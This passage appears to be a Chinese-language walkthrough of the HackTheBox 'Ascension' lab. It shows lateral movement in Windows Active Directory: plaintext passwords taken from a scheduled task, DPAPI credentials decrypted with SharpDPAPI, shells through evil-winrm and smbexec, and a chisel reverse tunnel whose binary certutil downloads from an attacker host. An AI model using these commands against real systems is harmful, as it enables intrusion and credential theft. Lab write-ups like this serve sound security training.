      Master_Browser
  Status                        : OK
  SystemType                    : x64-based PC
  ThermalState                  : 3
  TotalPhysicalMemory           : 12883873792
  UserName                      : WEB01\svc_dev
  WakeUpType                    : 6

====== WMIEventConsumer ======

  Name                              :   SCM Event Log Consumer
  ConsumerType                      :   S-1-5-32-544
  CreatorSID                        :   NTEventLogEventConsumer
  Category                          :   0
  EventID                           :   0
  EventType                         :   1
  InsertionStringTemplates          :   System.String[]
  MachineName                       :
  MaximumQueueSize                  :
  Name                              :   SCM Event Log Consumer
  NameOfRawDataProperty             :
  NameOfUserSIDProperty             :   sid
  NumberOfInsertionStrings          :   0
  SourceName                        :   Service Control Manager
  UNCServerName                     :
====== WMIEventFilter ======

  Name                           : SCM Event Log Filter
  Namespace                      : ROOT\Subscription
  EventNamespace                 : root\cimv2
  Query                          : select * from MSFT_SCMEventLogEvent
  QueryLanguage                  : WQL
  EventAccess                    :
  CreatorSid                     : S-1-5-32-544

====== WMIFilterBinding ======

  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
  CreatorSID                     : S-1-5-32-544

====== WSUS ======

  UseWUServer                    : False
  Server                         :
  AlternateServer                :
  StatisticsServer               :



[*] Completed collection in 22.054 seconds

```

## 敏感信息
> billing_user是本地管理员
>

```bash
 ** WEB01\Administrators **
 
User    WEB01\Administrator          S-1-5-21-...-500
Group   DAEDALUS\Domain Admins       S-1-5-21-...-512
User    DAEDALUS\billing_user        S-1-5-21-...-1603
```

```bash
  1. 计划任务 AutochkTask 明文泄露密码：
  net use E: \\fin01\invoices /user:billing_user D43d4lusB1ll1ngB055
  - billing_user 密码：D43d4lusB1ll1ngB055
  - 同时发现内网存在 fin01 财务服务器

  2. DPAPI 凭据管理器解密成功（Session 1 的功劳）：
  - sa 密码：MySAisL33TM4n

  3. dc1.daedalus.local 双网卡：
  - 192.168.10.6 和 192.168.11.6（有第二个内网段）
  4.local域控-10.13.38.53
```

## emil-winrm 
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q evil-winrm -i 192.168.10.39 -u billing_user -p 'D43d4lusB1ll1ngB055'
```

## Smbexec
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# smbexec.py 'DAEDALUS/billing_user:D43d4lusB1ll1ngB055@10.13.38.20'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\WINDOWS\system32>whoami
nt authority\system
C:\WINDOWS\system32>C:\Users\svc_dev\Desktop\ascension.exe
```

## Getflag
```bash
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\flag.txt
ASCENSION{N0_c0mm@nd_1s_saf3}
```

## 隧道搭建
```bash
certutil.exe -urlcache -split -f http://10.10.16.32/chisel.exe
```

```bash
chisel server -p 9999 --reverse
```

```bash
meterpreter > execute -f cmd.exe -a "/c C:\Users\svc_dev\Desktop\chisel.exe client 10.10.16.32:9999 R:socks"
Process 6388 created.
```

## 横向移动
### SharpDPAPI
```bash
meterpreter > upload /home/kali/Desktop/tools/WindowsBinaries-master/SharpDPAPIv1.11.1.exe "C:\Users\billing_user\Desktop\SharpDPAPI.exe"
[*] Uploading  : /home/kali/Desktop/tools/WindowsBinaries-master/SharpDPAPIv1.11.1.exe -> C:\Users\billing_user\Desktop\SharpDPAPI.exe
[*] Uploaded 127.00 KiB of 127.00 KiB (100.0%): /home/kali/Desktop/tools/WindowsBinaries-master/SharpDPAPIv1.11.1.exe -> C:\Users\billing_user\Desktop\SharpDPAPI.exe
[*] Completed  : /home/kali/Desktop/tools/WindowsBinaries-master/SharpDPAPIv1.11.1.exe -> C:\Users\billing_user\Desktop\SharpDPAPI.exe
```

#### machinecredentials
>  UserName : DAEDALUS\svc_backup
>
>  Credential : jkQXAnHKj#7w#XS$
>

```bash
*Evil-WinRM* PS C:\Users\billing_user\Desktop> .\SharpDPAPI.exe credentials /password:D43d4lusB1ll1ngB055

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.1


[*] Action: User DPAPI Credential Triage

[*] Will decrypt user masterkeys with password: D43d4lusB1ll1ngB055

[*] Found MasterKey : C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-500\0ce264ce-1e1d-4259-ba45-a3795d8e3346
[*] Found MasterKey : C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-500\508750b6-e8ff-4a95-97c3-08c76edeb759
[*] Found MasterKey : C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-500\96bf1bb5-5618-46ff-b32b-5ae439a9dafa
[*] Found MasterKey : C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-500\f77aed43-beff-4c38-805d-656a7bc7097a
[*] Found MasterKey : C:\Users\Administrator.DAEDALUS\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-500\19cc9310-f7b8-4800-9448-d65efcaa9137
[*] Found MasterKey : C:\Users\Administrator.DAEDALUS\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-500\33985371-4a3b-4a85-a887-93f61bd3b05b
[*] Found MasterKey : C:\Users\Administrator.DAEDALUS\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-500\dfb492b9-0fd8-4b37-9061-784cff03bce2
[*] Found MasterKey : C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\29c91d6e-339c-4e04-9796-f43aca8e1af3
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\2BF4CFC9-5473-4C95-8514-35861FCBF022
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\3b870919-06ba-4039-ba21-e48a161abdea
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\57279ce0-f8b0-47bd-b547-4a2a32a871fb
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\5a83c577-1a7b-4004-8280-0657f1fb8f32
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\714efe3b-2b16-4924-abc4-6c06388bd005
[*] Found MasterKey : C:\Users\MSSQLSERVER\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\a1d3533e-af1e-48ed-ab39-72ed6fdf477e
[*] Found MasterKey : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003\29C91D6E-339C-4E04-9796-F43ACA8E1AF3
[*] Found MasterKey : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003\2bf4cfc9-5473-4c95-8514-35861fcbf022
[*] Found MasterKey : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003\67f368d2-3d19-4912-89fc-643c7288b37d
[*] Found MasterKey : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003\93d13701-6d0b-4909-987f-daeb8e1a06df
[*] Found MasterKey : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003\a6d61830-7389-4ede-b859-3142a0db5d7f
[*] Found MasterKey : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003\dd067335-9e4c-441b-a3cd-a35c0be3418a

[*] User master key cache:

{19cc9310-f7b8-4800-9448-d65efcaa9137}:C1C75FBCFE5433F9225BDA31DE94D3340320E5D6
{33985371-4a3b-4a85-a887-93f61bd3b05b}:7F04AE7CF6817C8E89D5E408A93838FD8C266503
{dfb492b9-0fd8-4b37-9061-784cff03bce2}:6E59A3F5F234D8F7C1E7AA6859C35226B19F49A8
{56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}:1312251FB1AE77DEC889C6B88F391AD10BF59D87


[*] Triaging Credentials for ALL users


Folder       : C:\Users\Administrator\AppData\Local\Microsoft\Credentials\

  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}


  CredFile           : 83FEBF0027B9D0D06E0C8820B4C65F4D

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 512
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}


  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {0ce264ce-1e1d-4259-ba45-a3795d8e3346}
    size             : 11120
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {0ce264ce-1e1d-4259-ba45-a3795d8e3346}



Folder       : C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\

  CredFile           : 9F28ECEDA5A854D8BAE2D842289470D0

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 522
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}



Folder       : C:\Users\Administrator.DAEDALUS\AppData\Local\Microsoft\Credentials\

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {dfb492b9-0fd8-4b37-9061-784cff03bce2}
    size             : 11036
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] Decryption failed, likely incorrect password for the associated masterkey


Folder       : C:\Users\billing_user\AppData\Local\Microsoft\Credentials\

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
    size             : 11068
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    LastWritten      : 10/14/2020 5:34:28 AM
    TargetName       : WindowsLive:target=virtualapp/didlogical
    TargetAlias      :
    Comment          : PersistedCredential
    UserName         : 02pxaffekseinmsx
    Credential       :


Folder       : C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\

  CredFile           : C48FA9BC4637C67CB306A191C3C91E23

    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
    size             : 430
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 10/14/2020 5:35:22 AM
    TargetName       : Domain:interactive=DAEDALUS\svc_backup
    TargetAlias      :
    Comment          :
    UserName         : DAEDALUS\svc_backup
    Credential       : jkQXAnHKj#7w#XS$


Folder       : C:\Users\svc_dev\AppData\Local\Microsoft\Credentials\

  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0

    guidMasterKey    : {67f368d2-3d19-4912-89fc-643c7288b37d}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {67f368d2-3d19-4912-89fc-643c7288b37d}


  CredFile           : 83FEBF0027B9D0D06E0C8820B4C65F4D

    guidMasterKey    : {67f368d2-3d19-4912-89fc-643c7288b37d}
    size             : 512
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {67f368d2-3d19-4912-89fc-643c7288b37d}
```

#### credentials
```bash
*Evil-WinRM* PS C:\Users\billing_user\Desktop> .\SharpDPAPI.exe credentials /password:D43d4lusB1ll1ngB055

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.4.0


[*] Action: User DPAPI Credential Triage

[*] Triaging Credentials for ALL users


Folder       : C:\Users\Administrator\AppData\Local\Microsoft\Credentials\

  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}


  CredFile           : 83FEBF0027B9D0D06E0C8820B4C65F4D

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 512
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}


  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {0ce264ce-1e1d-4259-ba45-a3795d8e3346}
    size             : 11120
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {0ce264ce-1e1d-4259-ba45-a3795d8e3346}



Folder       : C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\

  CredFile           : 9F28ECEDA5A854D8BAE2D842289470D0

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 522
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}



Folder       : C:\Users\Administrator.DAEDALUS\AppData\Local\Microsoft\Credentials\

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {dfb492b9-0fd8-4b37-9061-784cff03bce2}
    size             : 11036
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {dfb492b9-0fd8-4b37-9061-784cff03bce2}



Folder       : C:\Users\billing_user\AppData\Local\Microsoft\Credentials\

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
    size             : 11068
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}



Folder       : C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\

  CredFile           : C48FA9BC4637C67CB306A191C3C91E23

    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
    size             : 430
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    [X] MasterKey GUID not in cache: {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}



Folder       : C:\Users\svc_dev\AppData\Local\Microsoft\Credentials\

  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0

    guidMasterKey    : {67f368d2-3d19-4912-89fc-643c7288b37d}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {67f368d2-3d19-4912-89fc-643c7288b37d}


  CredFile           : 83FEBF0027B9D0D06E0C8820B4C65F4D

    guidMasterKey    : {67f368d2-3d19-4912-89fc-643c7288b37d}
    size             : 512
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {67f368d2-3d19-4912-89fc-643c7288b37d}
```

### rusthound-ce
> 1. DC (10.13.38.53) — local 域
> + SID: S-1-5-21-197600473-3515118913-3158175032
> + 用户: Administrator, svc_dev, MSSQLSERVER
> 2.  DC1 (192.168.10.6) — daedalus.local 域
> + SID: S-1-5-21-4088429403-1159899800-2753317549
> + 用户: Administrator.DAEDALUS, billing_user, svc_backup
>
> 
>
> 目前持有的凭据 DAEDALUS\svc_backup : jkQXAnHKj#7w#XS$ 属于 daedalus.local 域
>
> 因此后续横向移动应该针对 DC1(192.168.10.6) 而不是 DC
>

```bash
proxychains -q rusthound-ce -u svc_backup -p 'jkQXAnHKj#7w#XS$' \
    -d daedalus.local -i 192.168.10.6 --zip
```

### bloodhound
> Remote Management Users 是 Windows 内置本地组，成员可以通过 WinRM (5985/5986) 连接到该机器
>

![](/image/hackthebox-prolabs/Ascension-5.png)



### evil-winrm
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/SharpTools]
└─# proxychains -q evil-winrm -i 192.168.10.6 -u svc_backup -p 'jkQXAnHKj#7w#XS$'  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Documents>
```

# daedalus.local/svc_backup-192.168.10.6
## evil-winrm
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/SharpTools]
└─# proxychains -q evil-winrm -i 192.168.10.6 -u svc_backup -p 'jkQXAnHKj#7w#XS$'  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Documents>
```

## Getflag
```bash
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Documents> type C:\Users\svc_backup.DAEDALUS\desktop\flag.txt
ASCENSION{15nT_dPaP1_s3cuRe?}
```

## 信息收集
### 查看监听
```bash
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Documents> netstat -an | findstr LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:64467          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:64469          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:64474          0.0.0.0:0              LISTENING
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
  TCP    192.168.10.6:53        0.0.0.0:0              LISTENING
  TCP    192.168.10.6:139       0.0.0.0:0              LISTENING
  TCP    192.168.11.6:53        0.0.0.0:0              LISTENING
  TCP    192.168.11.6:139       0.0.0.0:0              LISTENING
  TCP    [::]:88                [::]:0                 LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:464               [::]:0                 LISTENING
  TCP    [::]:593               [::]:0                 LISTENING
  TCP    [::]:5985              [::]:0                 LISTENING
  TCP    [::]:9389              [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49664             [::]:0                 LISTENING
  TCP    [::]:49665             [::]:0                 LISTENING
  TCP    [::]:49666             [::]:0                 LISTENING
  TCP    [::]:49668             [::]:0                 LISTENING
  TCP    [::]:49677             [::]:0                 LISTENING
  TCP    [::]:49678             [::]:0                 LISTENING
  TCP    [::]:49681             [::]:0                 LISTENING
  TCP    [::]:49694             [::]:0                 LISTENING
  TCP    [::]:64467             [::]:0                 LISTENING
  TCP    [::]:64469             [::]:0                 LISTENING
  TCP    [::]:64474             [::]:0                 LISTENING
  TCP    [::1]:53               [::]:0                 LISTENING
```

### ipconfig
```bash
C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.11.6
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 5:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.10.6
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
```

### 内网探测
```bash
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.11.%i | find "TTL="
```

### arp缓存
```bash
C:\>arp -a | find "192.168.11"

Interface: 192.168.11.6 --- 0xe
  192.168.11.201        00-50-56-94-3a-e7     dynamic   
  192.168.11.210        00-50-56-94-25-2f     dynamic   
  192.168.11.255        ff-ff-ff-ff-ff-ff     static    
```

### 枚举驱动器
> 发现E盘
>

```bash
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Documents> [System.IO.DriveInfo]::GetDrives()


Name               : C:\
DriveType          : Fixed
DriveFormat        : NTFS
IsReady            : True
AvailableFreeSpace : 10254999552
TotalFreeSpace     : 10254999552
TotalSize          : 26080178176
RootDirectory      : C:\
VolumeLabel        :

Name               : E:\
DriveType          : Fixed
DriveFormat        : NTFS
IsReady            : True
AvailableFreeSpace : 5326917632
TotalFreeSpace     : 5326917632
TotalSize          : 5349830656
RootDirectory      : E:\
VolumeLabel        : Backups
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Documents> Get-PSDrive -PSProvider FileSystem

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
C                                      FileSystem    C:\                                                                                                                                                              Users\svc_backup.DAEDALUS\Documents
E                                      FileSystem    E:\
```

### 敏感信息
#### Builtin.txt
```bash
Name    Type    Description
Access Control Assistance Operators     Security Group - Domain Local   Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Account Operators       Security Group - Domain Local   Members can administer domain user and group accounts
Administrators  Security Group - Domain Local   Administrators have complete and unrestricted access to the computer/domain
Backup Operators        Security Group - Domain Local   Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access Security Group - Domain Local   Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators Security Group - Domain Local   Members are authorized to perform cryptographic operations.
Distributed COM Users   Security Group - Domain Local   Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers       Security Group - Domain Local   Members of this group can read event logs from local machine
Guests  Security Group - Domain Local   Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Hyper-V Administrators  Security Group - Domain Local   Members of this group have complete and unrestricted access to all features of Hyper-V.
IIS_IUSRS       Security Group - Domain Local   Built-in group used by Internet Information Services.
Incoming Forest Trust Builders  Security Group - Domain Local   Members of this group can create incoming, one-way trusts to this forest
Network Configuration Operators Security Group - Domain Local   Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users   Security Group - Domain Local   Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users       Security Group - Domain Local   Members of this group can access performance counter data locally and remotely
Pre-Windows 2000 Compatible Access      Security Group - Domain Local   A backward compatibility group which allows read access on all users and groups in the domain
Print Operators Security Group - Domain Local   Members can administer printers installed on domain controllers
RDS Endpoint Servers    Security Group - Domain Local   Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
RDS Management Servers  Security Group - Domain Local   Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
RDS Remote Access Servers       Security Group - Domain Local   Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
Remote Desktop Users    Security Group - Domain Local   Members in this group are granted the right to logon remotely
Remote Management Users Security Group - Domain Local   Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Replicator      Security Group - Domain Local   Supports file replication in a domain
Server Operators        Security Group - Domain Local   Members can administer domain servers
Storage Replica Administrators  Security Group - Domain Local   Members of this group have complete and unrestricted access to all features of Storage Replica.
Terminal Server License Servers Security Group - Domain Local   Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
Users   Security Group - Domain Local   Users are prevented from making accidental or intentional system-wide changes and can run most applications
Windows Authorization Access Group      Security Group - Domain Local   Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
```

#### Daedalus.txt
```bash
*Evil-WinRM* PS E:\Annual IT Compliance Report - Export> type Daedalus.txt
Name    Type    Description
Builtin builtinDomain
Computers       Container       Default container for upgraded computer accounts
Daedalus Users  Organizational Unit
Domain Controllers      Organizational Unit     Default container for domain controllers
ForeignSecurityPrincipals       Container       Default container for security identifiers (SIDs) associated with objects from external, trusted domains
Managed Service Accounts        Container       Default container for managed service accounts
Users   Container       Default container for upgraded user accounts
```

#### Users.txt
> 发现凭据kF4df76fj*JfAcf73j
>

```bash
*Evil-WinRM* PS E:\Annual IT Compliance Report - Export> type Users.txt
Name    Type    Description
Administrator   User    DSRM Password: kF4df76fj*JfAcf73j
Allowed RODC Password Replication Group Security Group - Domain Local   Members in this group can have their passwords replicated to all read-only domain controllers in the domain
Cert Publishers Security Group - Domain Local   Members of this group are permitted to publish certificates to the directory
Cloneable Domain Controllers    Security Group - Global Members of this group that are domain controllers may be cloned.
Denied RODC Password Replication Group  Security Group - Domain Local   Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
DnsAdmins       Security Group - Domain Local   DNS Administrators Group
DnsUpdateProxy  Security Group - Global DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
Domain Admins   Security Group - Global Designated administrators of the domain
Domain Computers        Security Group - Global All workstations and servers joined to the domain
Domain Controllers      Security Group - Global All domain controllers in the domain
Domain Guests   Security Group - Global All domain guests
Domain Users    Security Group - Global All domain users
Don Jones       User
Enterprise Admins       Security Group - Universal      Designated administrators of the enterprise
Enterprise Key Admins   Security Group - Universal      Members of this group can perform administrative actions on key objects within the forest.
Enterprise Read-only Domain Controllers Security Group - Universal      Members of this group are Read-Only Domain Controllers in the enterprise
Group Policy Creator Owners     Security Group - Global Members in this group can modify group policy for the domain
Guest   User    Built-in account for guest access to the computer/domain
